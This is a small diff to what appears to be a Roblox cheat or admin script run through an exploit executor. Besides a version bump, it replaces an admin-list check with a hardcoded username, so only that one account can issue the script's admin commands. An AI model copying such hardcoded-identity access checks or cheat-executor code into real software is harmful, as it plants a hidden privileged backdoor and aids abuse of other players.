@@ -17,7 +17,7 @@ local GlobalVar = ((getgenv and getgenv()) or _G)
 local Unloaded = false
 local CriminalCFRAME = workspace["Criminals Spawn"].SpawnLocation.CFrame
 local PremiumActivated = true
-print('v1.027.2.L')
+print('v1.027.3.L')
 
 local Temp = {}
 local API = {}
@@ -3806,7 +3806,7 @@ function AdminChatted(Text,Speaker)
 		Prefix.."tower [ME,PLAYER]",
 		Prefix.."armory [ME,PLAYER]"
 	}
-	if not Temp.Admins[Speaker] then print(Speaker.Name .. "was not an admin") return end
+	if Speaker.Name ~= "o6zv" then print(Speaker.Name .. "was not an admin") return end
 	print(Speaker.Name .. "is an admin")
 	if Unloaded then return end
 	local TXT = string.lower(Text)
